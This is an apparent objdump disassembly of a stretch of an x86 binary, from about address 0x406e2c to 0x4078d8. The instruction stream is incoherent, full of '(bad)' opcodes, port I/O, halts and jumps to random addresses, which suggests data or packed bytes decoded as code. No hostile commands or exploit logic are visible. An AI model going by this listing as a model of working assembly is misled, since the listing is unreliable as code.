  406e2c:	and    ecx,0xffffffa4
  406e2f:	lds    eax,FWORD PTR [edx]
  406e31:	ret    0xe239
  406e34:	inc    esp
  406e35:	aad    0x43
  406e37:	imul   ecx,DWORD PTR [ebp+0x53aa922c],0xffffffd1
  406e3e:	ret    0x20
  406e41:	jmp    0x353fc106
  406e46:	ret    0xe8ac
  406e49:	jge    0x406e42
  406e4b:	pop    edx
  406e4c:	add    dl,bl
  406e4e:	and    bl,0xc2
  406e51:	xor    ch,bl
  406e53:	sbb    al,0xc
  406e55:	jmp    0x12c5268
	...
  406e82:	add    BYTE PTR [eax],al
  406e84:	xor    al,0xac
  406e86:	cmp    DWORD PTR [ebp+0x77],0x5b
  406e8a:	jne    0x406e97
  406e8c:	dec    edi
  406e8d:	push   edi
  406e8e:	add    BYTE PTR [eax],al
  406e90:	xchg   edi,eax
  406e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e92:	pop    ebx
  406e93:	leave  
  406e94:	and    eax,0x928aff48
  406e99:	inc    edi
  406e9a:	mov    edx,0x5b5700
  406e9f:	push   0x57
  406ea1:	add    al,0x75
  406ea3:	adc    BYTE PTR [eax-0x10f78afc],bh
  406ea9:	jp     0x406e79
  406eab:	add    BYTE PTR [edi-0x26],dl
  406eae:	mov    edi,0xf8586b7e
  406eb3:	sub    edx,ebp
  406eb5:	push   0xffffff83
  406eb7:	jge    0x406ef0
  406eb9:	pop    ebx
  406eba:	jne    0x406ec3
  406ebc:	mov    WORD PTR [edi+0x0],ss
  406ebf:	add    BYTE PTR [edi],dl
  406ec1:	out    dx,al
  406ec2:	add    ebx,ebp
  406ec4:	pop    ebp
  406ec5:	int    0xc3
  406ec7:	pop    edi
  406ec8:	fmul   QWORD PTR [edi]
  406eca:	ret    0x170c
  406ecd:	lods   al,BYTE PTR ds:[esi]
  406ece:	mov    ebp,esp
  406ed0:	xchg   esi,eax
  406ed1:	push   cs
  406ed2:	hlt    
  406ed3:	(bad)  
  406ed4:	loopne 0x406eda
  406ed6:	push   DWORD PTR [ebp-0x1d]
  406ed9:	rol    DWORD PTR [ebp-0xfaee0c],cl
  406edf:	(bad)  
  406ee0:	pop    edx
  406ee1:	(bad)  
  406ee2:	std    
  406ee3:	inc    DWORD PTR [eax]
  406ee5:	pop    eax
	...
  406f12:	out    0x1b,eax
  406f14:	test   esp,edi
  406f16:	xchg   ecx,eax
  406f17:	add    al,0xff
  406f19:	add    edi,edx
  406f1b:	pop    edx
  406f1c:	add    BYTE PTR [ebp-0xa8d6],cl
  406f22:	rol    BYTE PTR [esi*2+0x4b53e08],1
  406f29:	lea    edi,[ebx-0x66005618]
  406f2f:	je     0x406f4f
  406f31:	add    BYTE PTR [esp+eax*2],ah
  406f34:	jbe    0x406ebb
  406f36:	mov    al,dh
  406f38:	test   eax,0x459eeff
  406f3d:	call   0x44f581
  406f42:	mov    ebp,0x4274a9bc
  406f47:	cmp    ebx,eax
  406f49:	jne    0x406f85
  406f4b:	jno    0x406f11
  406f4d:	jmp    0x406f92
  406f4f:	fadd   QWORD PTR [edx]
  406f51:	add    BYTE PTR [esi],bh
  406f53:	inc    esp
  406f54:	mov    edx,0x4e4436c2
  406f59:	mov    edx,DWORD PTR [edx-0x3f]
  406f5c:	sar    ah,0x8d
  406f5f:	sub    esp,ecx
  406f61:	push   0xffffff94
  406f63:	ins    DWORD PTR es:[edi],dx
  406f64:	das    
  406f65:	or     BYTE PTR [esi],dl
  406f67:	mov    bh,0xa9
  406f69:	jmp    DWORD PTR [ecx]
  406f6b:	cmp    ebx,eax
  406f6d:	je     0x406fe1
  406f6f:	jmp    0x7f9b:0x4c8bff4c
	...
  406f9e:	add    BYTE PTR [eax],al
  406fa0:	or     DWORD PTR [ebp-0x58],eax
  406fa3:	or     edi,esi
  406fa5:	mov    BYTE PTR ds:0x4aa82eb,0x6a
  406fac:	aas    
  406fad:	mov    edi,0x258eff3e
  406fb2:	cs or  dh,dl
  406fb5:	jmp    0xbf7e706f
  406fba:	ret    
  406fbb:	jle    0x406fcb
  406fbd:	leave  
  406fbe:	ds adc al,0x6
  406fc1:	jg     0x406f6c
  406fc3:	jne    0x407001
  406fc5:	rol    DWORD PTR [edx],1
  406fc7:	mov    edx,DWORD PTR [ebx]
  406fc9:	pop    ebx
  406fca:	cmc    
  406fcb:	jl     0x407019
  406fcd:	shr    ecx,0x1d
  406fd0:	aas    
  406fd1:	loopne 0x406ffe
  406fd3:	test   eax,0xf8144e0e
  406fd8:	cwde   
  406fd9:	test   al,0xd9
  406fdb:	test   al,0xb
  406fdd:	pop    edi
  406fde:	xchg   ecx,eax
  406fdf:	pop    esp
  406fe0:	dec    bp
  406fe2:	jbe    0x406fd0
  406fe4:	cli    
  406fe5:	push   0xfffffffb
  406fe7:	add    eax,0xcc6c5665
  406fec:	jmp    0x2b24:0x5c471fe
  406ff3:	(bad)  
  406ff5:	test   al,0x62
  406ff7:	xchg   edi,eax
  406ff8:	mov    edi,0x51abe916
  406ffd:	dec    ebp
  406ffe:	call   0xa8:0x93c064dc
	...
  40702d:	add    bl,cl
  40702f:	bound  eax,QWORD PTR [ecx+0xb]
  407032:	cmp    DWORD PTR [ebp+0x26],ecx
  407035:	cld    
  407036:	icebp  
  407037:	mov    DWORD PTR [esi-0x63b37be3],0xe6219fb
  407041:	test   al,0x19
  407043:	popa   
  407044:	sub    DWORD PTR [esi],ebp
  407046:	cmp    al,0x40
  407048:	xchg   esi,eax
  407049:	or     BYTE PTR [ebx+0x1fbe96b],0x4d
  407050:	ja     0x407052
  407052:	mov    dh,0x5b
  407054:	icebp  
  407055:	add    edi,DWORD PTR [esi]
  407057:	inc    eax
  407058:	jmp    0x8e04:0x436b837a
  40705f:	fisub  WORD PTR [ebx+0x4]
  407062:	(bad)  
  407063:	dec    esp
  407064:	(bad)  
  407065:	push   esp
  407066:	rol    esi,1
  407068:	icebp  
  407069:	fwait
  40706a:	push   cs
  40706b:	push   ds
  40706c:	add    cl,ch
  40706e:	cmp    eax,0x3c30bfd6
  407073:	inc    eax
  407074:	sub    al,0x1c
  407076:	cmp    eax,0xdc6eb98
  40707b:	loopne 0x4070d1
  40707d:	in     eax,0x24
  40707f:	imul   ebp,DWORD PTR [edx-0x17],0xe984dded
  407086:	in     eax,0x4c
  407088:	call   FWORD PTR [ecx]
  40708a:	loope  0x407052
  40708c:	or     al,0x76
  40708e:	in     al,dx
  40708f:	push   0x58
  407091:	rol    BYTE PTR [eax],0x0
	...
  4070bc:	(bad)  
  4070bd:	push   0xffffff83
  4070bf:	in     al,0x4d
  4070c1:	pop    ebx
  4070c2:	jne    0x4070ae
  4070c4:	cld    
  4070c5:	aas    
  4070c6:	add    al,0x6c
  4070c8:	jne    0x407091
  4070ca:	cdq    
  4070cb:	bound  edi,QWORD PTR [ebp-0x50]
  4070ce:	leave  
  4070cf:	sub    edx,DWORD PTR [esi+0x4c]
  4070d2:	push   esp
  4070d3:	jb     0x40707b
  4070d5:	fadd   st,st(3)
  4070d7:	xor    ecx,esi
  4070d9:	xchg   edi,edi
  4070db:	ret    
  4070dc:	cmp    eax,0x359cffa4
  4070e1:	xor    al,0xc4
  4070e3:	ss loope 0x407131
  4070e6:	(bad)  
  4070e7:	lods   al,BYTE PTR ds:[esi]
  4070e8:	fstp   DWORD PTR [edx+0x0]
  4070eb:	jmp    0xf195512d
  4070f0:	xchg   esp,eax
  4070f1:	imul   ecx,DWORD PTR [ebp+0x6aaad5a4],0xfc9686ed
  4070fb:	cdq    
  4070fc:	mov    al,ds:0x8fe608c5
  407101:	pop    edi
  407102:	inc    edi
  407103:	push   0xe30d4f16
  407108:	out    0x61,al
  40710a:	je     0x4070ef
  40710c:	mov    esp,0xe700f8cd
  407111:	mov    cl,cl
  407113:	xor    edx,DWORD PTR [edi-0x6f74fb10]
  407119:	fdivr  DWORD PTR [edi-0x3df1b7fd]
  40711f:	add    al,0x0
	...
  407149:	add    BYTE PTR [edi+0x14ec8baa],ah
  40714f:	or     al,0xf4
  407151:	push   ebx
  407152:	pusha  
  407153:	outs   dx,DWORD PTR ds:[esi]
  407154:	cwde   
  407155:	cmp    ah,BYTE PTR [edi-0x271317a9]
  40715b:	hlt    
  40715c:	dec    BYTE PTR [ecx+0x458d0362]
  407162:	add    ebp,DWORD PTR [eax-0xb2fd618]
  407168:	(bad)  
  407169:	xor    edi,esp
  40716b:	jno    0x40718b
  40716d:	push   0x6d
  40716f:	outs   dx,DWORD PTR ds:[esi]
  407170:	add    dl,bh
  407172:	push   edi
  407173:	push   edi
  407174:	push   DWORD PTR [ebp-0xd]
  407177:	hlt    
  407178:	je     0x407182
  40717a:	out    dx,eax
  40717b:	retf   
  40717c:	(bad)  
  40717d:	dec    DWORD PTR [eax]
  40717f:	fstp   TBYTE PTR [edi+0x47d30f]
  407185:	add    BYTE PTR [edi],ah
  407187:	add    dh,BYTE PTR [ebp-0xc]
  40718a:	dec    edi
  40718b:	adc    edi,0xff3348ff
  407191:	stc    
  407192:	pop    ss
  407193:	pop    edi
  407194:	jbe    0x40719b
  407196:	bound  eax,QWORD PTR ds:[ecx]
  407199:	add    BYTE PTR [edi],ah
  40719b:	add    dh,BYTE PTR [ebp-0xc]
  40719e:	das    
  40719f:	xchg   esp,eax
  4071a0:	(bad)  
  4071a1:	dec    DWORD PTR [eax]
  4071a3:	retf   
  4071a4:	shl    BYTE PTR [ebx+eiz*1+0x1],0x75
  4071a9:	hlt    
  4071aa:	pinsrw mm3,ecx,0xff
	...
  4071d6:	add    BYTE PTR [eax],al
  4071d8:	or     ch,al
  4071da:	push   ebp
  4071db:	hlt    
  4071dc:	ds mov ebp,0x9c3e6a12
  4071e2:	lock and BYTE PTR [esi],bh
  4071e5:	xor    al,0xa4
  4071e7:	jne    0x4071b3
  4071e9:	or     DWORD PTR [edi],ebp
  4071eb:	hlt    
  4071ec:	shl    DWORD PTR [esi-0x8],0xc6
  4071f0:	add    ecx,DWORD PTR [esp+eax*1]
  4071f3:	add    BYTE PTR [esi],bh
  4071f5:	xor    al,0x1b
  4071f7:	sub    cl,bh
  4071f9:	jb     0x4071ff
  4071fb:	jmp    FWORD PTR [ebx]
  4071fd:	lock fwait
  4071ff:	into   
  407200:	test   DWORD PTR [ebx+eax*1],esi
  407203:	push   ebx
  407204:	inc    ebp
  407205:	hlt    
  407206:	das    
  407207:	ss mov ch,0xdc
  40720a:	sbb    ebp,DWORD PTR [eax]
  40720c:	icebp  
  40720d:	jb     0x407213
  40720f:	call   0x44706d
  407214:	cmp    eax,0xb5474dbc
  407219:	mov    DWORD PTR [ebx-0x6c],ebp
  40721c:	dec    edi
  40721d:	xor    al,0x3
  40721f:	mov    al,0x4b
  407221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407222:	push   esi
  407223:	mov    eax,0x323aa
  407228:	adc    eax,0x4147be73
  40722d:	xor    al,0x4c
  40722f:	push   ebx
  407230:	fdivr  QWORD PTR es:[eax+0x3fcb3e00]
  407237:	clc    
  407238:	mov    DWORD PTR [edx+0xff3d],eax
	...
  407266:	xor    edx,DWORD PTR [ecx]
  407268:	dec    eax
  407269:	push   0x41e956
  40726e:	adc    edi,eax
  407270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407271:	call   0x44ff39
  407276:	ins    DWORD PTR es:[edi],dx
  407277:	cmp    eax,0xbd8274c3
  40727c:	lods   al,BYTE PTR ds:[esi]
  40727d:	push   0x43365b36
  407282:	xor    esi,DWORD PTR ds:[edi-0x15a4c146]
  407289:	stos   DWORD PTR es:[edi],eax
  40728a:	jno    0x40722e
  40728c:	(bad)  
  40728d:	les    edx,FWORD PTR [edi+0x3e03d7ee]
  407293:	or     ebp,esp
  407295:	mov    cl,0x90
  407297:	add    bl,BYTE PTR [ebp+0x12]
  40729a:	ds pop ebx
  40729c:	add    al,bl
  40729e:	js     0x407241
  4072a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a1:	add    edx,DWORD PTR [ecx]
  4072a3:	scas   al,BYTE PTR es:[edi]
  4072a4:	xchg   ecx,eax
  4072a5:	pusha  
  4072a6:	nop
  4072a7:	dec    ecx
  4072a8:	xchg   esi,eax
  4072a9:	js     0x40729e
  4072ab:	push   0xffffffe2
  4072ad:	ror    DWORD PTR [edx],1
  4072af:	pop    edi
  4072b0:	jo     0x4072b3
  4072b2:	xchg   ebp,eax
  4072b3:	pusha  
  4072b4:	sbb    DWORD PTR [eax+esi*2+0x19a47628],ebx
  4072bb:	and    DWORD PTR [esi],esp
  4072bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072be:	inc    ebx
  4072bf:	stos   BYTE PTR es:[edi],al
  4072c0:	ret    0xf3a4
  4072c3:	dec    esi
  4072c4:	push   ecx
  4072c5:	fild   DWORD PTR [esi+0x805649]
	...
  4072f3:	add    bl,bl
  4072f5:	inc    edx
  4072f6:	jmp    0xac62ac27
  4072fb:	stos   DWORD PTR es:[edi],eax
  4072fc:	ds pop ebx
  4072fe:	mov    DWORD PTR [ebx],eax
  407300:	inc    ecx
  407301:	iret   
  407302:	xor    DWORD PTR [ebx+esi*4+0x462e2e4f],esp
  407309:	xor    ecx,DWORD PTR [esi]
  40730b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40730c:	sub    DWORD PTR [ecx+0x1e],ecx
  40730f:	sub    dh,BYTE PTR cs:[ecx+edx*4]
  407313:	int    0x19
  407315:	dec    ecx
  407316:	loop   0x4072db
  407318:	mov    ebx,DWORD PTR [ebp+0x12]
  40731b:	or     BYTE PTR ds:0xb50c751b,dh
  407321:	scas   al,BYTE PTR es:[edi]
  407322:	add    ch,bh
  407324:	jno    0x407393
  407326:	push   DWORD PTR [ecx+ebp*8+0x49]
  40732a:	jne    0x407309
  40732c:	popf   
  40732d:	lods   eax,DWORD PTR ds:[esi]
  40732e:	xor    al,0x64
  407330:	cli    
  407331:	ret    
  407332:	add    eax,0x5b4392
  407337:	jmp    0x733521fc
  40733c:	ror    BYTE PTR [ecx+0x75],1
  40733f:	mov    ch,0x9d
  407341:	lods   eax,DWORD PTR ds:[esi]
  407342:	or     BYTE PTR [esi+0x41e84757],dh
  407348:	jl     0x407392
  40734a:	push   DWORD PTR [edx-0x7f]
  40734d:	test   al,0x5b
  40734f:	mov    al,0x78
  407351:	push   edi
  407352:	add    BYTE PTR [ecx+ecx*8],bh
  407355:	aaa    
  407356:	and    DWORD PTR [ebp+0x0],0x0
	...
  407381:	add    dl,ch
  407383:	scas   eax,DWORD PTR es:[edi]
  407384:	push   ebx
  407385:	ror    al,cl
  407387:	mov    bl,0x0
  407389:	leave  
  40738a:	cmp    eax,0x7c0ae85b
  40738f:	dec    eax
  407390:	jmp    DWORD PTR [eax+0x7]
  407393:	inc    edi
  407394:	push   0xff485de9
  407399:	push   ecx
  40739a:	and    al,0x29
  40739c:	call   DWORD PTR [esi-0x35]
  40739f:	sahf   
  4073a0:	mov    ah,0xc1
  4073a2:	cmp    eax,0x95e9007b
  4073a7:	xchg   edx,eax
  4073a8:	fidivr WORD PTR [esi]
  4073aa:	popf   
  4073ab:	rol    BYTE PTR [ebp+esi*2-0x31],cl
  4073af:	(bad)
  4073b2:	push   ds
  4073b3:	dec    eax
  4073b4:	(bad)  
  4073b5:	jmp    0x54337bca
  4073ba:	cmc    
  4073bb:	popf   
  4073bc:	rcl    ch,0x3d
  4073bf:	pop    ebx
  4073c0:	add    BYTE PTR [esi],ah
  4073c2:	xchg   DWORD PTR [edi],ebp
  4073c4:	inc    DWORD PTR [eax]
  4073c6:	and    BYTE PTR [eax+eax*1-0x39],bl
  4073ca:	(bad)  
  4073cc:	(bad)  
  4073cd:	pop    ds
  4073ce:	out    0x5b,eax
  4073d0:	push   DWORD PTR [ebp-0x1d]
  4073d3:	in     al,dx
  4073d4:	inc    esp
  4073d5:	shl    al,1
  4073d7:	bound  esi,QWORD PTR [edi+ecx*4+0x458d0b1a]
  4073de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073df:	mov    ebp,DWORD PTR [eax+0x0]
  4073e2:	out    0x5b,eax
  4073e4:	sub    BYTE PTR [edx+0x0],0x0
	...
  407410:	xlat   BYTE PTR ds:[ebx]
  407411:	cld    
  407412:	je     0x40741c
  407414:	out    dx,eax
  407415:	test   dl,cl
  407417:	add    BYTE PTR [edi-0x668b3fa8],ah
  40741d:	loopne 0x40749b
  40741f:	rcl    BYTE PTR [edi-0x2e16fa9e],1
  407425:	pop    ebx
  407426:	add    BYTE PTR [eax],al
  407428:	call   0xa14024bf
  40742d:	pop    ebx
  40742e:	add    BYTE PTR [ebp-0xaf50a6],cl
  407434:	mov    ah,BYTE PTR [edi+0x5b670068]
  40743a:	or     BYTE PTR [ebp-0x17afe0e6],0x45
  407441:	sbb    DWORD PTR [eax],eax
  407443:	add    BYTE PTR [ebx+ebx*1+0x75],ch
  407447:	add    eax,0xb6fe
  40744c:	fadd   DWORD PTR [si-0x4c]
  407450:	sbb    DWORD PTR [eax+eax*1-0x73],ebx
  407454:	sbb    BYTE PTR [ebx],0xb9
  407457:	cmp    al,0x27
  407459:	pop    ebx
  40745a:	add    BYTE PTR [ebx],dh
  40745c:	addr16 in eax,dx
  40745e:	test   eax,0x3c1adac7
  407463:	add    BYTE PTR [edi],dl
  407465:	pop    ebx
  407466:	push   DWORD PTR [ebp+0x3e]
  407469:	test   al,0x92
  40746b:	inc    ebp
  40746c:	and    bh,BYTE PTR [esi+0x48]
  40746f:	aam    0x9
  407471:	add    eax,DWORD PTR ds:[eax]
	...
  40749c:	add    BYTE PTR [eax],al
  40749e:	stc    
  40749f:	call   DWORD PTR [edx+0x33459ff]
  4074a5:	lea    edi,[ebx+0x74]
  4074a8:	xor    ebp,DWORD PTR [edx+0x3e]
  4074ab:	stos   BYTE PTR es:[edi],al
  4074ac:	add    al,0xff
  4074ae:	imul   ebp,eax,0xffffffab
  4074b1:	out    0x7,al
  4074b3:	xor    eax,0xb0fe0b03
  4074b8:	or     al,BYTE PTR [ebx+0x7503e44b]
  4074be:	cmp    al,0x29
  4074c0:	and    al,0xff
  4074c2:	xor    edx,DWORD PTR [eax]
  4074c4:	mov    eax,ds:0x469cea75
  4074c9:	dec    edi
  4074ca:	push   DWORD PTR [ebx]
  4074cc:	mov    al,ds:0x1aece275
  4074d1:	leave  
  4074d2:	ds xor al,0x84
  4074d5:	les    ebp,FWORD PTR [esi]
  4074d7:	and    eax,0x64664558
  4074dc:	add    BYTE PTR cs:[ecx+0x68e89f4f],al
  4074e3:	retf   0xffa1
  4074e6:	inc    ebp
  4074e7:	hlt    
  4074e8:	push   ss
  4074e9:	add    dl,BYTE PTR [ebp+0x67]
  4074ec:	mov    eax,DWORD PTR [ebp-0x5a]
  4074ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f0:	pop    ss
  4074f1:	mov    esp,0xcb4266
  4074f6:	ds add al,0xa0
  4074f9:	jne    0x407485
  4074fb:	popf   
  4074fc:	pop    ss
  4074fd:	mov    eax,0xff9bef56
	...
  40752a:	add    BYTE PTR [eax],al
  40752c:	cmp    DWORD PTR [ecx],edi
  40752e:	ret    
  40752f:	jne    0x40756d
  407531:	cdq    
  407532:	hlt    
  407533:	(bad)  
  407534:	mov    bl,0x5b
  407536:	stc    
  407537:	mov    al,ds:0x171e57ab
  40753c:	(bad)  
  40753d:	xor    bl,ah
  40753f:	sahf   
  407540:	adc    DWORD PTR [esi+0x62],eax
  407543:	mov    esp,0xac41d009
  407548:	cld    
  407549:	adc    ebp,ecx
  40754b:	add    edi,ecx
  40754d:	iret   
  40754e:	cmp    eax,0xee2844ac
  407553:	mov    al,ds:0xaba5cfe9
  407558:	cmp    al,0x28
  40755a:	fisub  WORD PTR [eax-0x542a3027]
  407560:	aam    0x26
  407562:	into   
  407563:	mov    al,ds:0x412219b5
  407568:	neg    DWORD PTR [eax]
  40756a:	in     eax,dx
  40756b:	add    edx,DWORD PTR [ebx]
  40756d:	rol    ah,cl
  40756f:	test   BYTE PTR [edx+0x46],bh
  407572:	bound  eax,QWORD PTR [esi+0x3a]
  407575:	push   edx
  407576:	test   eax,0xe91e3817
  40757b:	add    edi,DWORD PTR [esi]
  40757d:	pop    ebx
  40757e:	jmp    0xe987714b
  407583:	add    edi,DWORD PTR [esi]
  407585:	pop    ebx
  407586:	je     0x4075ce
  407588:	sub    BYTE PTR [edx+0x464a167e],0xfc
  40758f:	or     eax,DWORD PTR [eax]
	...
  4075b9:	add    BYTE PTR [esi-0x4d],ah
  4075bc:	outs   dx,DWORD PTR ds:[esi]
  4075bd:	mov    al,ds:0x9fe3d969
  4075c2:	ds iret 
  4075c4:	imul   BYTE PTR ds:0xfdc463e
  4075ca:	push   ecx
  4075cb:	iret   
  4075cc:	dec    ebp
  4075cd:	stos   DWORD PTR es:[edi],eax
  4075ce:	lock inc esp
  4075d0:	inc    esi
  4075d1:	mov    al,ds:0x9fb445ee
  4075d6:	es idiv edi
  4075d9:	adc    al,0xde
  4075db:	inc    esp
  4075dc:	pop    eax
  4075dd:	and    BYTE PTR [ebx],al
  4075df:	push   esp
  4075e0:	add    BYTE PTR [edx+esi*4-0x46da7cc9],bh
  4075e7:	mov    ebp,0x5ab1acc7
  4075ec:	add    BYTE PTR [edi-0x1801610a],al
  4075f2:	cmp    eax,0x806c04b1
  4075f7:	inc    edi
  4075f8:	push   eax
  4075f9:	cmp    DWORD PTR [ebp+0x15e9005b],0x3de9ff44
  407603:	inc    esp
  407604:	jne    0x4075f7
  407606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407607:	popf   
  407608:	leave  
  407609:	jmp    0xe602884b
  40760e:	cmp    eax,0xbdd58bae
  407613:	pop    ds
  407614:	lods   al,BYTE PTR ds:[esi]
  407615:	push   ss
  407616:	ins    DWORD PTR es:[edi],dx
  407617:	sbb    al,0x45
  407619:	test   DWORD PTR [edx],edi
  40761b:	pop    ebx
  40761c:	add    cl,ch
	...
  407646:	add    BYTE PTR [eax],al
  407648:	mov    WORD PTR [ecx],fs
  40764a:	push   0xff44ade9
  40764f:	xchg   ecx,eax
  407650:	xor    BYTE PTR [edi],ah
  407652:	call   DWORD PTR [esi+0x1c09ec3]
  407658:	inc    edx
  407659:	imul   eax,DWORD PTR [eax],0xffffffe9
  40765c:	aad    0xb2
  40765e:	fdivr  QWORD PTR [esi-0x27]
  407661:	rol    BYTE PTR [ecx+esi*1+0x22],cl
  407665:	pop    ebx
  407666:	adc    cl,ch
  407668:	cmp    eax,0xc1455c33
  40766d:	inc    esp
  40766e:	mov    DWORD PTR [ecx+edi*8-0xcd2832b],esp
  407675:	xchg   BYTE PTR [eax],al
  407677:	jmp    0x100feb9
  40767c:	add    al,0xb1
  40767e:	mov    DWORD PTR [ebp+0x63],0x27ffff3b
  407685:	in     eax,0x74
  407687:	ror    BYTE PTR [eax-0x3d002b6e],0x9f
  40768e:	pop    DWORD PTR [ebp+0x37]
  407691:	sbb    al,0x45
  407693:	fsubr  DWORD PTR [eax]
  407695:	push   esp
  407696:	add    BYTE PTR [eax],al
  407698:	pusha  
  407699:	xchg   edx,eax
  40769a:	hlt    
  40769b:	dec    DWORD PTR [eax]
  40769d:	pop    eax
  40769e:	add    BYTE PTR [ebp+0x68501ba2],cl
  4076a4:	out    0x57,eax
  4076a6:	add    BYTE PTR [eax+0x75ff57bd],al
	...
  4076d4:	add    BYTE PTR [eax],al
  4076d6:	out    dx,eax
  4076d7:	out    dx,eax
  4076d8:	imul   ecx,eax,0xc00b57e7
  4076de:	jae    0x40773d
  4076e0:	cmp    DWORD PTR [ebp-0x6d],0x57
  4076e4:	jne    0x4076eb
  4076e6:	out    dx,al
  4076e7:	cli    
  4076e8:	(bad)  
  4076e9:	jmp    DWORD PTR [edi-0x174fbae4]
  4076ef:	push   esp
  4076f0:	add    BYTE PTR [eax],al
  4076f2:	or     dl,BYTE PTR [ebx+0x62d850b0]
  4076f8:	mov    esp,0x57a768
  4076fd:	sbb    BYTE PTR [edx],0x93
  407700:	les    edx,FWORD PTR [eax-0x41]
  407703:	xchg   edx,eax
  407704:	enter  0x9700,0x50
  407708:	shl    BYTE PTR [ebp+0x62],0xf6
  40770c:	xlat   BYTE PTR ds:[ebx]
  40770d:	add    BYTE PTR [edi+0x57],ah
  407710:	mov    eax,DWORD PTR [ebp+0x2f]
  407713:	push   ds
  407714:	add    BYTE PTR [eax],al
  407716:	jmp    0x5f:0x3bb9c47a
  40771d:	add    BYTE PTR [esi],bh
  40771f:	popa   
  407720:	(bad)  
  407721:	repz xchg esp,eax
  407723:	jl     0x40776d
  407725:	les    eax,FWORD PTR [edx]
  407727:	xor    al,BYTE PTR [ebx]
  407729:	add    BYTE PTR [ecx],bh
  40772b:	or     BYTE PTR [ebx-0x71],bl
  40772e:	jnp    0x4076b4
  407730:	mov    BYTE PTR [ebp+0x6],0x72
  407734:	push   cs
  407735:	add    BYTE PTR [esi],bh
  407737:	jno    0x407781
  407739:	hlt    
	...
  407762:	add    BYTE PTR [eax],al
  407764:	sbb    DWORD PTR [edx],esi
  407766:	add    eax,DWORD PTR [eax]
  407768:	ret    
  407769:	out    dx,eax
  40776a:	(bad)  
  40776b:	push   eax
  40776c:	xchg   esp,eax
  40776d:	xor    al,0x29
  40776f:	add    BYTE PTR [ecx],al
  407771:	rcr    BYTE PTR [edi-0x18],0xf7
  407775:	jns    0x40777a
  407777:	add    BYTE PTR [ebp+0x74],al
  40777a:	pop    ss
  40777b:	push   es
  40777c:	mov    ebp,0x6b00b7af
  407781:	das    
  407782:	stos   BYTE PTR es:[edi],al
  407783:	mov    WORD PTR [esi],?
  407785:	xor    al,0x3
  407787:	dec    DWORD PTR [ebx+0x44]
  40778a:	pushf  
  40778b:	jne    0x40778b
  40778d:	adc    DWORD PTR [edi],edx
  40778f:	mov    eax,0x414d4056
  407794:	add    DWORD PTR ds:[edi],edx
  407797:	mov    esp,0xc5b2a6
  40779c:	ds mov ch,0xc8
  40779f:	adc    al,0x31
  4077a1:	mov    eax,ds:0x6deedc47
  4077a6:	add    al,0xff
  4077a8:	or     esi,esp
  4077aa:	stos   DWORD PTR es:[edi],eax
  4077ab:	sti    
  4077ac:	xchg   cl,dl
  4077ae:	pushf  
  4077af:	or     edi,DWORD PTR [esi+0x3f]
  4077b2:	add    ebx,ebp
  4077b4:	sbb    bl,cl
  4077b6:	inc    edi
  4077b7:	mov    ah,0x71
  4077b9:	aas    
  4077ba:	push   edi
  4077bb:	call   0xffde2a5f
  4077c0:	popa   
  4077c1:	pop    ebx
  4077c2:	fcomp  QWORD PTR [edi+0x66]
  4077c5:	push   0x27
  4077c7:	add    al,0x0
	...
  4077f1:	add    BYTE PTR [esi],bh
  4077f3:	stos   DWORD PTR es:[edi],eax
  4077f4:	push   esi
  4077f5:	pop    ss
  4077f6:	mov    al,BYTE PTR [edx-0x2c]
  4077f9:	push   edi
  4077fa:	push   esi
  4077fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077fc:	inc    eax
  4077fd:	popf   
  4077fe:	cmp    DWORD PTR [esi+0x29],edx
  407801:	pop    ss
  407802:	cmp    al,0x36
  407804:	clc    
  407805:	sub    BYTE PTR [ebx+0x4a17e96b],0x42
  40780c:	pushf  
  40780d:	repz sbb al,cl
  407810:	in     eax,dx
  407811:	pushf  
  407812:	mov    eax,DWORD PTR [edi]
  407814:	add    DWORD PTR [edi+eax*1+0x42],eax
  407818:	push   cs
  407819:	or     esi,edi
  40781b:	(bad)  
  40781c:	jmp    0x4077c6
  40781e:	push   ecx
  40781f:	(bad)  
  407820:	and    BYTE PTR [ecx],cl
  407822:	adc    eax,0x838ed8c7
  407827:	out    dx,eax
  407828:	cwde   
  407829:	pushf  
  40782a:	imul   esp,DWORD PTR [edi-0x1a],0x16
  40782e:	xchg   edx,eax
  40782f:	xor    al,BYTE PTR [eax]
  407831:	cdq    
  407832:	rol    DWORD PTR [ecx+0x62],1
  407835:	mov    ebx,0xab95c7c9
  40783a:	cwde   
  40783b:	sbb    ecx,ebp
  40783d:	add    edi,DWORD PTR [ecx-0x5f545639]
  407843:	and    al,0xb6
  407845:	pushf  
  407846:	test   eax,0x98ab6dc7
  40784b:	and    al,0xa6
  40784d:	pushf  
  40784e:	cdq    
  40784f:	(bad)  
  407850:	popa   
  407851:	stos   DWORD PTR es:[edi],eax
  407852:	jo     0x407878
  407854:	xchg   esi,eax
  407855:	pushf  
	...
  40787e:	add    BYTE PTR [eax],al
  407880:	mov    ebp,0xa033dbf
  407885:	push   ebx
  407886:	xchg   BYTE PTR [esi],dl
  407888:	stos   BYTE PTR es:[edi],al
  407889:	xor    bl,BYTE PTR [ecx+0x4171b9]
  40788f:	bound  edi,QWORD PTR [esi-0x5b]
  407892:	pop    edi
  407893:	mov    al,ds:0xbc006a7f
  407898:	(bad)  
  407899:	and    DWORD PTR cs:0x322badb5,0xffffffbe
  4078a1:	mov    edi,0x9129e90c
  4078a6:	add    esp,0x2d
  4078a9:	inc    ecx
  4078aa:	jae    0x40785d
  4078ac:	rcl    BYTE PTR [esi-0x39356604],0xc
  4078b3:	inc    ecx
  4078b4:	sahf   
  4078b5:	sbb    DWORD PTR [eax],eax
  4078b7:	jmp    0xd9b8947c
  4078bc:	mov    dl,0xc6
  4078be:	or     al,0x1
  4078c0:	xor    ch,BYTE PTR ds:0x96b40eff
  4078c6:	clc    
  4078c7:	push   es
  4078c8:	push   eax
  4078c9:	aas    
  4078ca:	call   0x9c715c
  4078cf:	loop   0x4078ce
  4078d1:	(bad)  
  4078d2:	sbb    esi,ebp
  4078d4:	dec    ebx
  4078d5:	imul   edi,edi,0x5c
  4078d8:	mov    edx,0x4254ffab
